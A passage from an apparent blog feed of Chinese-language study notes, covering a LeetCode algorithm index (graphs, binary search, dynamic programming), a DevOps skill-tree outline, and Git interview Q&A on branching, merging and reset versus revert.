class="headerlink" title="DFS"></a>DFS</h2><p>前序(Preorder)</p><p>中序(Inorder)</p><p>後序(Postorder)</p><h1 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h1><blockquote><p><a href="https://leozzmc.github.io/posts/2009beb7.html">Graph 筆記整理-1</a><br><a href="https://leozzmc.github.io/posts/2e799f6d.html">Graph 筆記整理-2</a></p></blockquote><p>Graph 主要由節點(vertex, node)跟邊(edge)構成，基本上有分成有向跟無向圖，還有一些特性像是是否是連接(connected) 以及是否有環(circle) 存在。 圖的題目類型通常會是給定一個2D陣列要你去求數量或是面積還有路徑，或者有些會給 Adjacency Matrix (List) 來告訴你節點的連接關係。目前學到的走訪方式有: <strong>DFS</strong>,  <strong>BFS</strong> (後續好像還有 Topological Sort)</p><table><thead><tr><th></th><th>DFS</th><th>BFS</th></tr></thead><tbody><tr><td>適用範圍</td><td>有向圖、無向圖</td><td>有向圖、無向圖</td></tr><tr><td>用途</td><td>找路徑(不一定最短)</td><td>找最短路徑</td></tr></tbody></table><h2 id="無向圖"><a href="#無向圖" class="headerlink" title="無向圖"></a>無向圖</h2><p>(1) <strong>找出陣列中的 Connected Components</strong><br>可使用 <code>DFS</code>, <code>BFS</code> 在走訪過程中透過 counter 來記錄數量，這種題目也會有其他變形題目</p><ul><li><a href="https://leozzmc.github.io/posts/b7e69c9.html">LeetCode#200. Number of Islands</a> 這題就是單純紀錄　connected components 數量</li><li><a href="https://leozzmc.github.io/posts/6c6d3ce.html">LeetCode#695. Max Area of Island</a>  這題就是單純紀錄　connected components 數量，還需要累加大小並做比較</li><li><a href="https://leozzmc.github.io/posts/8d1c6ed0.html">LeetCode#133. Clone Graph</a> 這題為了deep copy 一個 graph，會需要先走訪tree並記錄到 hash table</li><li><a href="https://leozzmc.github.io/posts/51295e83.html">LeetCode#130. Surrounded Regions</a> 這題比較特別，他會是從矩陣邊緣開始先找搜尋起點，再去走訪，並且搜尋起點只會在邊緣。</li><li><a href="https://leozzmc.github.io/posts/7fd7eb24.html">417. Pacific Atlantic Water Flow</a> 這題的策略也是需要先從矩陣邊緣作為起點開始走訪，並且會進行兩次 BFS 來去取交集找出座標位置。</li></ul><p>(2) <strong>找出最短路徑</strong></p><ul><li><a href="https://leozzmc.github.io/posts/79e94c86.html">LeetCode#286. Walls and Gates</a> 這題需要透過 BFS 走訪網格，並且直接將距離更新到網格中，這題的bfs 會優先將搜尋起點(閘門)推入Queue中去解</li></ul><h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><blockquote><p><a href="https://leozzmc.github.io/posts/48f553b3.html">Recursion 和 Backtracking 筆記整理</a></p></blockquote><h2 id="使用情境1-排列組合"><a href="#使用情境1-排列組合" class="headerlink" title="使用情境1: 排列組合"></a>使用情境1: 排列組合</h2><h2 id="使用情境2-子集"><a href="#使用情境2-子集" class="headerlink" title="使用情境2: 子集"></a>使用情境2: 子集</h2><h2 id="使用情境3-迴文"><a href="#使用情境3-迴文" class="headerlink" title="使用情境3: 迴文"></a>使用情境3: 迴文</h2><h1 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h1><p>題目可能會給陣列或字串，然後要做的事就是要先定義出左右兩側邊界以及中間值，</p><p>框架會像是下面這樣</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> left = &lt;MIN_VALUE&gt;;</span><br><span class="line"><span class="type">int</span> right = &lt;MAX_VALUE&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// left ~ mid ~ right</span></span><br><span class="line"><span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">  <span class="type">int</span> mid = left + (right-left) /<span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(&lt;VALID&gt;)&#123;</span><br><span class="line">    <span class="comment">// 將範圍收窄成陣列左半邊</span></span><br><span class="line">    <span class="comment">// left ~ mid-1</span></span><br><span class="line">    right = mid <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//將範圍收窄成陣列右半邊</span></span><br><span class="line">    <span class="comment">// mid +1 ~ right</span></span><br><span class="line">    left = mid +<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常見題目"><a href="#常見題目" class="headerlink" title="常見題目"></a>常見題目</h2><ul><li><a href="https://leozzmc.github.io/posts/7a271795.html"> LeetCode#875. Koko Eating Bananas</a>: 這題主要是透過先定義出最大跟最小吃香蕉的速度，然後透過 Binary Search 來去挑選吃相較的速度值，再去透過其他函數驗證這個值是否能夠在時間內吃完香蕉。接著會去收窄範圍，最終得出的吃香蕉速度就會是最小的。</li></ul><h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><h1 id="Dynamic-Programming"><a href="#Dynamic-Programming" class="headerlink" title="Dynamic Programming"></a>Dynamic Programming</h1><blockquote><p><a href="https://leozzmc.github.io/posts/dynamic_programming.html">DP 筆記整理</a> 整理了Dynamic Programming 的解題邏輯，跟問題背景會是怎樣的， <strong>DP會是最佳化解答的好工具!</strong></p></blockquote><p>判斷：<strong>1. 大量重複子問題</strong>, <strong>2. 解決所有子問題，可以得到整體問題的最最佳化答案</strong> 這時候就可以先找出題目的遞迴關係式(暴力解)，接著再透過 Memoization進行最佳化，或者如果透過Iteration 的方式直接提出最佳解。</p><h2 id="使用情境1-選與不選的問題"><a href="#使用情境1-選與不選的問題" class="headerlink" title="使用情境1: 選與不選的問題"></a>使用情境1: 選與不選的問題</h2><p><strong>對於每個元素，都可以選或不選，藉由多種選或不選的組合，可以找出正確結果，但包含了大量的重複計算</strong></p><ul><li><a href="https://leozzmc.github.io/posts/355cc876.html">LeetCode#70. Climbing Stairs</a></li><li><a href="https://leozzmc.github.io/posts/35e03d8a.html">LeetCode#322. Coin Change</a></li><li><a href="https://leozzmc.github.io/posts/9081d01d.html">LeetCode#139. Word Break</a></li><li><a href="https://leozzmc.github.io/posts/cd4d1860.html">LeetCode#120. Triangle</a></li></ul><p>其中還包括許多變形，像是股票交易的題目</p><ul><li><a href="https://leozzmc.github.io/posts/c95a58c1.html">LeetCode#309. Best Time to Buy and Sell Stock with Cooldown</a></li></ul><h2 id="使用情境2-迴文系列問題"><a href="#使用情境2-迴文系列問題" class="headerlink" title="使用情境2: 迴文系列問題"></a>使用情境2: 迴文系列問題</h2><p>這類題目通常在遞迴函數之外還需要額外定義的 **用於檢查回文的函數 <code>checkPalindrome</code>**，通常會將最佳化的 <code>dp</code> 陣列用於這個函數，來避免大量重複計算，如果直接用 <code>reverse()</code> 會是較高的複雜度，通常會透過 Two Pointer 的方式來去實踐回文檢查</p><p>Example</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    left++;</span><br><span class="line">    right--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><ul><li><a href="https://leozzmc.github.io/posts/141899d4.html">LeetCode#647. Palindromic Substrings</a></li><li><a href="https://leozzmc.github.io/posts/bf0dee7b.html">LeetCode#5. Longest Palindromic Substring</a></li></ul><h1 id="常見演算法"><a href="#常見演算法" class="headerlink" title="常見演算法"></a>常見演算法</h1><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevOps技能樹知識整理 |【筆記目錄】</title>
      <link href="/posts/dce71546.html"/>
      <url>/posts/dce71546.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這裡紀錄 DevOps 面試常見的知識點，主要是參考了這個 <a href="https://github.com/bregman-arie/devops-exercises">github repository: DevOps Exercises</a> 和 <a href="https://github.com/ByteByteGoHq/system-design-101">ByteByteGo 的 GitHub Repo</a> 所做的筆記整理</p><blockquote><p>可能會花很久時間才能夠全部整理完成~</p></blockquote><h1 id="DevOps-General"><a href="#DevOps-General" class="headerlink" title="DevOps General"></a>DevOps General</h1><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><ul><li>Basic Data Types</li><li>OOP &#x2F; Class</li><li>Raise Exceptions</li><li>Regex</li><li>Async</li><li>File Manipulation</li><li>OS</li><li>lambda</li><li>decorator</li><li>Flask</li></ul><blockquote><p>文章： <a href="https://leozzmc.github.io/posts/70fcdd32.html">Python for DevOps |【DevOps技能樹】</a></p></blockquote><h1 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h1><ul><li>TCP&#x2F;UDP</li><li>OSI Model</li><li>CIDR</li><li>Mac Addr.</li><li>CSMA&#x2F;CD</li><li>NAT</li><li>DNS</li><li>ICMP</li><li>TLS&#x2F;SSL Handshake</li><li>Route Table</li><li>ARP</li><li>DHCP</li><li>VLAN </li><li>SDN </li><li>Configuration</li><li>..etc</li></ul><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ul><li>Basic Commands</li><li>Filesystem Hierarchy Standard</li><li>Permissions</li><li>Regex</li><li>I&#x2F;O Redirection</li><li>Systemd</li><li>Kernel</li><li>SSH</li><li>Boot Process</li><li>Disk and Filesystem</li><li>Performance Analysis</li><li>…etc</li></ul><h1 id="Shell-Scripting"><a href="#Shell-Scripting" class="headerlink" title="Shell Scripting"></a>Shell Scripting</h1><h1 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h1><h1 id="Certificates"><a href="#Certificates" class="headerlink" title="Certificates"></a>Certificates</h1><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><ul><li>git commands </li><li>branch</li><li>merge</li><li>rebase</li><li>git internal principals</li><li>troubleshooting</li><li>..etc</li></ul><blockquote><p>文章: <a href="https://leozzmc.github.io/posts/22911275.html">Git for DevOps 筆記 |【DevOps技能樹】</a></p></blockquote><h1 id="CI-x2F-CD"><a href="#CI-x2F-CD" class="headerlink" title="CI&#x2F;CD"></a>CI&#x2F;CD</h1><ul><li>CI </li><li>CD </li><li>Drone</li><li>Jenkins </li><li>GitHub Actions</li></ul><h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><ul><li>container</li><li>images</li><li>container state</li><li>registry</li><li>storage</li><li>containerfile</li><li>tags</li><li>docker architecture</li><li>docker networking</li><li>docker compose</li><li>docker Security</li><li>OCI</li><li>..etc</li></ul><h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1><ul><li>Cluster Architecture</li><li>Pods</li><li>Labels and Selectors</li><li>Deployments</li><li>Services</li><li>Ingress</li><li>ReplicaSet</li><li>DaemonSet</li><li>StatefulSet</li><li>Storage</li><li>Networking</li><li>Policies</li><li>etcd</li><li>Namespaces</li><li>Secrets</li><li>Volumes</li><li>Access Control</li><li>CronJob</li><li>Helm</li><li>Security </li><li>Troubleshooting</li><li>Itsio</li><li>Controllers</li><li>Scheduler</li><li>Taints</li><li>Monitoring</li><li>Kustomize</li><li>…etc</li></ul><h1 id="Cloud-General"><a href="#Cloud-General" class="headerlink" title="Cloud General"></a>Cloud General</h1><h1 id="Virtualization"><a href="#Virtualization" class="headerlink" title="Virtualization"></a>Virtualization</h1><ul><li>VMware vSphere</li><li>Proxmox VE </li><li>KVM</li></ul><h1 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h1><ul><li>Regions &amp; AZs</li><li>IAM</li><li>VPC  </li><li>EC2 </li><li>ELB </li><li>Auto-Scaling Group</li><li>S3</li><li>DNS</li><li>Route53</li><li>Lambda </li><li>API Gateway</li><li>SNS &#x2F; Pinpoint</li><li>SQS</li><li>MQ</li><li>Cloudformation</li><li>AWS CDK </li><li>ECS </li><li>EKS</li><li>Fargate</li><li>…etc<blockquote><p>文章: <a href="https://leozzmc.github.io/posts/100cc6b6.html">AWS for DevOps 筆記 |【DevOps技能樹</a></p></blockquote></li></ul><h1 id="Terraform"><a href="#Terraform" class="headerlink" title="Terraform"></a>Terraform</h1><h1 id="System-Design"><a href="#System-Design" class="headerlink" title="System Design"></a>System Design</h1><h1 id="Distributed-System"><a href="#Distributed-System" class="headerlink" title="Distributed System"></a>Distributed System</h1><h1 id="MLOps"><a href="#MLOps" class="headerlink" title="MLOps"></a>MLOps</h1><h1 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h1><ul><li>CPU </li><li>RAM </li><li>BIOS&#x2F;UEFI</li><li>Disk </li><li>…etc</li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Linux </tag>
            
            <tag> DevOps </tag>
            
            <tag> Networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git for DevOps 筆記 |【DevOps技能樹】</title>
      <link href="/posts/22911275.html"/>
      <url>/posts/22911275.html</url>
      
        <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><blockquote><p><em><strong>Q:你要如何確認一個目錄是一個 git repository?</strong></em></p></blockquote><p>檢查是否有 <code>.git</code> 文件</p><blockquote><p><em><strong>Q:請解釋什麼是 <code>git directory</code>, <code>working directory</code>, <code>staging area</code></strong></em></p></blockquote><p><strong>Git目錄</strong>:<br>適用於儲存項目歷史紀錄的地方。包含所有 commit history, branch, label 等資料，存放於專案目錄中的 <code>.git</code> 資料夾內。</p><p>Git 目錄其實就是負責管理版本的主要資料存放地，可以透過 <code>git log</code> 命令查看資訊</p><p><strong>工作目錄</strong><br>目前正在操作的專案目錄。在工作目錄中，git 會去提取 Git 目錄中的某個特定版本(正常會是最新版本)，並將檔案提取出來，讓使用者可以直接編輯跟修改。</p><p>使用者對於工作目錄的變更並不會自動被 git 偵測，需要手動進行 <code>add</code> 以及 <code>commit</code> 進行更新。</p><p><strong>Staging Area(暫存區)</strong><br>是一個臨時空間，可以讓你暫時將工作目錄的變更添加到暫存區，等待進一步提交，所以當你進行 <code>git add</code> 的時候，檔案就會從工作目錄轉移到暫存區。最終當使用 <code>git commit</code> 的時候，Git 就會將暫存區內容提交到 Git 目錄中 (<code>.git</code>)，形成新的提交。 </p><blockquote><p><em><strong>Q:<code>git pull</code> 以及 <code>git fetch</code> 之間有什麼差異？</strong></em></p></blockquote><p>簡單來說 <code>git pull</code> &#x3D;  <code>git fetch</code> + <code>git merge</code></p><p><strong><code>git fetch</code></strong> 就是單純從遠端倉庫下載最新的變更到本地端，並更新本地的remote branch 紀錄 (<code>orgin/main</code>) 但並不會將這些變合併到當前的工作分支，因此在 <code>git fecth</code> 後需要手動使用 <code>git merge</code> 或 <code>git rebase</code></p><p><strong><code>git pull</code></strong> 就是 <code>git fetch</code> 和 <code>git merge</code> 的組合指令。</p><p><strong>如果在進行 <code>git pull</code> 時，若遠端或本地都有修改，就可以遇到合併衝突</strong></p><blockquote><p><em><strong>Q:要如何確定一個檔案是否是 tracked的？若沒有則track</strong></em></p></blockquote><ol><li>檢查檔案是否被追蹤</li></ol><p>使用 <code>git status</code> 來檢查當前檔案狀態，如果檔案出現在 <code>Untracked files</code> 中則代表該檔案未被追蹤，而如果檔案在 <code>Changes not stagged for commit</code> 則代表已經被追蹤，但修改尚未提交</p><p>以本篇部落格為例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">On branch en</span><br><span class="line">Your branch is up to date with &#x27;origin/en&#x27;.</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line">        modified:   source/_posts/k8s-devops.md</span><br><span class="line"></span><br><span class="line">Untracked files:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</span><br><span class="line">        source/_posts/git-dveops.md</span><br></pre></td></tr></table></figure><ol start="2"><li>將未被追蹤的檔案加入追蹤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;file&gt;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Q: 請解釋 gitignore 用途是什麼?</strong></em></p></blockquote><p>用於確保特定檔案不會被 Git 追蹤。 當你新增或修改    <code>.gitignore</code>，希望讓 Git 忽略某些檔案或資料夾，但發現它們已經被 Git 追蹤時，可以先使用 <code>git rm --cached</code> 將這些檔案從追蹤中移除，然後 Git 就會依據<code>gitignore</code> 忽略它們。</p><p>Example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached -r node_modules/</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Q: 當你在 Commit 之前可以透過哪些方法得知做了哪些變更?</strong></em></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><p>如果是要看最新的commit 以及 staging area 之間的差異，可以加上 <code>cached</code> 參數</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff --cached</span><br></pre></td></tr></table></figure><p>若要查看工作目錄與最新commit之間的差異</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD</span><br></pre></td></tr></table></figure><h1 id="情境題"><a href="#情境題" class="headerlink" title="情境題"></a>情境題</h1><blockquote><p><em><strong>Q: 你有個檔案在遠端倉庫中，但你不希望Git追蹤他，你做什麼來讓後續Git 都不追蹤該檔案</strong></em></p></blockquote><p>將改檔案添加到 <code>gitignore</code> 當中，使該檔案不會被添加到 staging area</p><blockquote><p><em><strong>Q: 在你們組織中，有個開發團隊使用單體式遠端倉庫，該repo十分巨大，包含上千份檔案，開發團隊發現他們進行一般 git 操作變得十分緩慢，像是 git status，請問這是什麼原因導致，你該如何幫助他們？</strong></em></p></blockquote><p>問題分析：</p><ol><li>檔案數量太大根複雜目錄結構會導致像是 <code>git diff</code>, <code>git status</code> 操作進行比對時增加負擔</li><li>大量歷史紀錄會讓讀取時效能降低</li><li>如果文件本身也很大，也會導致修改檔案時速度變慢</li></ol><p>解決辦法：</p><ol><li>架構調整，使用 git submodule 或者 git subtree 將單體式架構拆分成多個小倉庫，將不同部分移到各自獨立的倉庫中。</li><li>如果是要 clone 專案，如果開發者只需要最新的版本，不需要完整記錄，則可以使用 <code>--depth</code> 參數進行淺層的 clone</li><li>而如果開發者只需要專案中的某些特定資料夾或檔案，可以使用 <strong>Sparse Checkout</strong>  來 checkout 所需要的部分</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git sparse-checkout init --cone</span><br><span class="line">git sparse-checkout <span class="built_in">set</span> &lt;PATH_TO_FOLDER&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>使用 <strong>GIT LFS</strong> 來管理大文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git lfs track <span class="string">&quot;*.c&quot;</span> <span class="comment"># track all big .c files</span></span><br></pre></td></tr></table></figure><h1 id="Branches"><a href="#Branches" class="headerlink" title="Branches"></a>Branches</h1><p>Branch 是在 git 中程式碼的平行開發線，可以讓開發者在不影響主線程式碼的情況下進行變更。</p><blockquote><p><em><strong>什麼是 branch strategy (flow)? 舉例一下有哪些 branch strategy</strong></em></p></blockquote><p><strong>Git Flow</strong></p><p><img src="/img/devops/git/gitflow.png"><br><em>Image Source: <a href="https://medium.com/@sreekanth.thummala/choosing-the-right-git-branching-strategy-a-comparative-analysis-f5e635443423">https:&#x2F;&#x2F;medium.com&#x2F;@sreekanth.thummala</a></em></p><p>適合 release 週期長，有穩定版本需求的專案。</p><ul><li>main branch: 主分支，用於儲存穩定且發佈的版本</li><li>develop branch: 開發分支，所有新功能會在本分支合併</li><li>feature branch: 功能分支，用於開發新功能，每個新功能會應該基於 devlop branch 去建立，並且需要在開發完成後合併回 develop</li><li>release branch: 發布分支，當 develop 分支的程式碼達到可發布的階段時，會從develop branch 去建立 release branch 進行最後測試和修正</li><li>hotfix branch: 熱修復分支，用於緊急修復已發布版本的問題，需要從 main branch 建立，修復完畢後合併回 main 跟 develop</li></ul><blockquote><p>缺點: 頻繁建立分支再合併可能會增加git hostory的複雜度</p></blockquote><p><strong>GitHub Flow</strong></p><p><img src="/img/devops/git/githubflow.png"></p><p>GitHub Flow 較為輕量化，適合快速迭代跟持續部署的專案，只有兩個主要分支，通常比較適合小型團隊</p><ul><li>main branch: 主分支，包含穩定且隨時可部署的程式碼</li><li>feature branches: 功能分支，開發人員會從 main branch 建立新的 branch 來開發新功能或修復bug。在功能完成並測試後，會發Pull Request(PR) 並合併回 main branch</li></ul><blockquote><p>缺點: 不適合生命週期長的專案</p></blockquote><p><strong>GitLab Flow</strong></p><p><img src="/img/devops/git/gitlab.png"></p><p>結合了 Git Flow 跟 GitHub Flow 的特色，適合複雜度介於兩者之間的專案，允許在不同環境進行測試和部署，適合有多個測試環境、且需要穩定發布的專案。</p><ul><li>main branch: 主分支，儲存穩定版本</li><li>feature branch: 功能分支，用於開發新功能跟修正錯誤，會從 main branch 開始建立，完成後會合併回 main branch</li><li>environment branches: 環境分支，Ex. pre-production, staging 等。對應不同的部署環境，可以再進行測試與驗證</li><li>relase branch: 發布分支，用於特定版本的發布管理</li></ul><blockquote><p>缺點：多版本管理時複雜度一樣會提升</p></blockquote><p><strong>Trunk Based Development</strong></p><p><img src="/img/devops/git/trunk.png"></p><p>這種Flow 更加極端，主要強調快速開發跟持續整合。</p><ul><li>main branch: 唯一的主要分支，所以開發活動都直接合併到主分支</li><li>短暫的 feature branches: 功能分支存在時間非常短暫，通常在幾天內完成並合併回 main，或直接在 main 上進行開發。</li></ul><blockquote><p>缺點: 對自動化測試和CI&#x2F;CD 系統高度仰賴。團隊技術和協作能力要求高</p></blockquote><blockquote><p><em><strong>現在你有兩個 branch，分別是 main 和 dev，你要如何確保兩個 branch 是同步的？</strong></em></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git pull</span><br><span class="line">git checkout dev</span><br><span class="line">git merge main</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>當我執行 git branch 命令執行時，他的工作原理，實際會發生什麼事情?</strong></em></p></blockquote><p>Git 此時在背後會做的事情會是 <strong>1. 建立一個新的分支指標</strong>，git 會在 <code>.git/refs/heads</code> 資料夾中建立新的檔案，檔案名稱會是你設定的分支名稱。接著會 <strong>指向到當前的 commit</strong>，剛剛所說的新檔案，檔案內容會是一個指向當前commit 的 SHA-1 hash 值，代表新分支從當前 commit 開始</p><blockquote><p><em><strong>當你跑 <code>git branch</code> 命令時，Git 要怎麼知道最新commit 的 SHA-1 值？</strong></em></p></blockquote><p>會去 <code>.git/refs/heads</code> 找到對應的 branch 名稱後輸出對應的SHA-1 值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/leozzmc.github.io/.git/refs/heads</span><br><span class="line">❯ cat en </span><br><span class="line">fc58a8885d29bc422d8089e08eaf826d41a2b5c8</span><br></pre></td></tr></table></figure><p>當你 checkout 到其他 branch 的時候，Git 同時也會去更新 <code>.git/HEAD</code> 為 <code>refs/heads/&lt;Branch Name&gt;</code></p><h1 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h1><blockquote><p><em><strong>你現在有兩個 branch: main 和 dev，要如何將 dev merge到 main?</strong></em></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git merge dev</span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>要如何解決合併衝突(Merge Conflicts)?</strong></em></p></blockquote><p>首先要確認有衝突的檔案是哪個? 可以透過 <code>git status</code> 查看，這些檔案會 <code>unmerged</code>。接著打開有衝突的檔案，git 應該會標記有衝突的區域，像是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">// 來自當前分支（HEAD）的變更</span><br><span class="line">=======</span><br><span class="line"> // 來自要合併分支的變更</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; branch-name</span><br></pre></td></tr></table></figure><p>接著可能就是要跟其他開發者或團隊溝通，看要保留哪些部分。檔案編輯完畢後保存檔案，就可以透過 <code>git add &lt;filename&gt;</code> 來標記衝突已解決。之後就可以 commmit 了。</p><blockquote><p><em><strong>你熟悉哪些 merge strategies嗎?</strong></em></p></blockquote><p>Git 中有好幾種常見的 Merge 策略，像是</p><p><strong>Fast-Forward</strong></p><p>如果合併的 branch 和 main branch 沒有新的commit時，可以使用 Fast-Forward merge。 Git 會將 main branch 的指標直接 fast-forward 到 branch 的最新commit，並且不會建立新的 merge commit。這種方式適合線性開發的情況，讓git history 保持清晰。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branch_name&gt; --ff</span><br></pre></td></tr></table></figure><p><strong>Recursive</strong><br>這是Git 預設的merge策略，如果要合併有共同祖先的的分支時，會先從共同的 base commit 開始計算雙方分支的差異，然後自動生成 merge commit。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branch-name&gt;</span><br></pre></td></tr></table></figure><p><strong>Squash</strong></p><p>Squash Commit 會將所有的commit 壓縮成一個 commit，並且合併到目標 branch，這樣主要分支上就只會出現一個commit 紀錄。</p><p>這種做法適合用在完成功能開發後，將零碎的commit 打包成一個乾淨的commit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge --squash &lt;branch-name&gt;</span><br></pre></td></tr></table></figure><p><strong>Octopus</strong></p><p>適合多個 branch 同時合併的情況，通常會是將多個feature branches 合併到 main branch。git 會同時將多個分支上的變更合併成一個 commit。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branch1&gt; &lt;branch2&gt; &lt;branch3&gt;</span><br></pre></td></tr></table></figure><p><strong>Ours Merge</strong></p><p>特殊的合併策略，<strong>當 merge conflicts 無法解決或不希望保留其他分支的變更時，可以使用 Ours Merge。</strong></p><p>這種策略就是即使有衝突，Git 也會選擇保留當前branch的內容，而捨棄被合併分支的變更。這種策略通常用於臨時的緊急合併或無法協調的衝突狀況。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge -s ours &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong><code>git reset</code>以及<code>git revert</code>之間的差異是什麼？</strong></em></p></blockquote><p><code>git revert</code> 用來提交一個新的 commit 來抵銷之前的 commit</p><p>假設今天有 commit A, commit B, commit C，若現在想要撤銷對 B 的變更，則可以藉由命令 <code>git revert B</code> 來去建立一個新的 commit D，這個 commit 得內容會跟 B 的相反，這樣最終得commit history 會是 A-&gt;B-&gt;C-&gt;D</p><p><code>git reset</code> 則用於重置當前 branch 的指標(HEAD) 到指定的commit上，並且可以選擇是否保留對於工作目錄的變更。 <strong>這就代表 <code>git reset</code> 可以變更 branch 的 commit history</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --soft &lt;commit-hash&gt; 